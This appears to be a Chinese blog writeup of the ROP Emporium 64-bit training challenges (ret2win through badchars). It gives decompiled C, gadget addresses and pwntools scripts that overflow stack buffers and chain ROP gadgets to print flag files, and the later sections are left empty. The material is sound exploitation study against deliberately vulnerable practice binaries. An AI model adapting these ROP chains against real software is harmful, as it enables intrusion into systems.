    <url>/2021/12/24/ROP-Emporium-64%E4%BD%8D/</url>
    <content><![CDATA[<p>部分writeup</p>
<span id="more"></span>
<h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><p>checksec一下，64位程序，只开启了NX保护。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2win by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="pwnme函数"><a href="#pwnme函数" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个栈溢出漏洞，调用后门拿到flag</p>
<h3 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400756</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="split"><a href="#split" class="headerlink" title="split"></a>split</h1><p>checksec一下，64位程序，只开启了NX保护。</p>
<h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-1"><a href="#main函数-1" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;split by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwnme函数-1"><a href="#pwnme函数-1" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个栈溢出漏洞</p>
<h3 id="usefulFunction"><a href="#usefulFunction" class="headerlink" title="usefulFunction"></a>usefulFunction</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/ls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>属于是出题人给的hint，程序中存在system函数，也存在能调用的数据段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000601060	00000012	C	/bin/cat flag.txt</span><br></pre></td></tr></table></figure>

<p>由于64位程序传参(前6个)要通过寄存器 RDI、RSI、RDX、 RCX、R8 和 R9，因此我们需要构造ROP链来进行栈溢出操作。</p>
<p>查找pop rdi的地址，利用ROPgadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000004007c3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4007c3</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">0x400560</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><p>checksec一下，64位程序，只开启了NX。</p>
<h2 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-2"><a href="#main函数-2" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;callme by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="callme-two函数"><a href="#callme-two函数" class="headerlink" title="callme_two函数"></a>callme_two函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">callme_two</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEFDEADBEEF</span>LL || a2 != <span class="number">0xCAFEBABECAFEBABE</span>LL || a3 != <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(<span class="string">&quot;key1.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key1.dat&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    g_buf[i] ^= fgetc(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;callme_two() called correctly&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="callme-three函数"><a href="#callme-three函数" class="headerlink" title="callme_three函数"></a>callme_three函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">callme_three</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;key2.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key2.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">16</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(stream);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>三个函数都对附件中的文件进行了操作，应该是得到flag或者下一步提示的操作。要调用的话我们要将它们的参数分别重新设置一下。</p>
<p>因为callme函数调用后直接就exit了，所以还要找到ret地址</p>
<p>找到需要的rop</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</span><br></pre></td></tr></table></figure>

<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">set_a=p64(<span class="number">0x40093c</span>)+p64(<span class="number">0xDEADBEEFDEADBEEF</span>)+p64(<span class="number">0xCAFEBABECAFEBABE</span>)+p64(<span class="number">0xD00DF00DD00DF00D</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+set_a+p64(<span class="number">0x400720</span>)</span><br><span class="line">payload+=set_a+p64(<span class="number">0x400740</span>)</span><br><span class="line">payload+=set_a+p64(<span class="number">0x4006F0</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h1><p>checksec一下，64位程序，只开启了NX。</p>
<h2 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-3"><a href="#main函数-3" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwnme函数是个外联函数，属于附件中libwrite4.so的。待会查看一下</p>
<h3 id="usefulFunction函数"><a href="#usefulFunction函数" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示有print_file函数可以被调用</p>
<h3 id="pwnme函数-2"><a href="#pwnme函数-2" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write4 by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Go ahead and give me the input already!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在栈溢出漏洞。</p>
<h3 id="print-file函数"><a href="#print-file函数" class="headerlink" title="print_file函数"></a>print_file函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(a1, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file: %s\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以用来读取有用的文件，再看看有没有可以用的数据段……好像没得</p>
<p>找到一个可读写的段，比如bss段，正好8字节长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idx=23 addr=0x00001038 off=0x00001038 sz=8 vsz=8 perm=-rw- name=.bss</span><br></pre></td></tr></table></figure>

<p>查找有用的rop，就在usefulFunction函数的汇编代码下边有个usefulGadget</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400628</span></span><br><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 mov     [r14], r15</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062B</span> ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>然后解题思路就很明了了，设r14和r15寄存器的值分别为bss段地址和’flag.txt’然后调用usefulGadget，然后bss段传入rdi作为usefulFunction的参数调用</p>
<p>查看有用的gadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400690 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400693 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">usefulGadget=<span class="number">0x400628</span></span><br><span class="line">pop_r14_r15=<span class="number">0x400690</span></span><br><span class="line">pop_rdi=<span class="number">0x400693</span></span><br><span class="line">print_file=<span class="number">0x400510</span></span><br><span class="line">bss=<span class="number">0x601038</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_r14_r15)+p64(bss)+p64(<span class="number">0x7478742e67616c66</span>)+p64(usefulGadget)+p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h1><h2 id="函数-4"><a href="#函数-4" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-4"><a href="#main函数-4" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwnme函数是外联函数待会看</p>
<h3 id="usefulFunction函数-1"><a href="#usefulFunction函数-1" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>print_file函数也是外联函数</p>
<h3 id="pwnme函数-3"><a href="#pwnme函数-3" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 j; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个栈溢出</p>
<h3 id="print-file"><a href="#print-file" class="headerlink" title="print_file"></a>print_file</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(a1, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file: %s\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为做过wirte4的原因，我首先就去看了看text段，果然有usefulGadget</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400628</span></span><br><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 <span class="keyword">xor</span>     [r15], r14b</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040062</span>C                 add     [r15], r14b</span><br><span class="line">.text:<span class="number">000000000040062F</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400630</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400630</span>                 sub     [r15], r14b</span><br><span class="line">.text:<span class="number">0000000000400633</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400634</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400634</span>                 mov     [r13+<span class="number">0</span>], r12</span><br><span class="line">.text:<span class="number">0000000000400638</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400638</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400639</span>                 align <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000400640</span></span><br><span class="line">.text:<span class="number">0000000000400640</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没有可用的数据段，找一个可读写的自己写，比如bss段，正好8字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idx=23 addr=0x00001038 off=0x00001038 sz=8 vsz=8 perm=-rw- name=.bss</span><br></pre></td></tr></table></figure>

<p>通过  mov     [r13+0], r12把’flag.txt’写入bss段，可以利用这段给r13,r12 赋值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>

<p>但是因为后边会给检测输入有没有’x’,’g’,’a’,’.’，所以我们还要使用剩下的Gadget绕过</p>
<p>本来是想用’flag.txt’的十六进制形式与0xffffffffffffffff进行异或运算存入后再异或一次就能得到正确的字符串，但是xor好像只能进行一个字节一个字节的进行异或，所以还原时只能进行每位与0xff异或了</p>
<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">print_file=<span class="number">0x400510</span></span><br><span class="line">bss=<span class="number">0x601038</span></span><br><span class="line">mov_r13_r12=<span class="number">0x400634</span></span><br><span class="line">pop_r12_r13_14_15=<span class="number">0x40069c</span></span><br><span class="line">pop_rdi=<span class="number">0x4006a3</span></span><br><span class="line">xor_r15_r14=<span class="number">0x400628</span></span><br><span class="line">pop_r14_15=<span class="number">0x4006a0</span></span><br><span class="line">payload=<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_r12_r13_14_15)+p64(<span class="number">0x8b878bd1989e9399</span>)+p64(bss)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(mov_r13_r12)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	payload+=p64(pop_r14_15)+p64(<span class="number">0xff</span>)+p64(bss+i)+p64(xor_r15_r14)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h1><h1 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h1><p>麻了，这道题可真给我难坏了。</p>
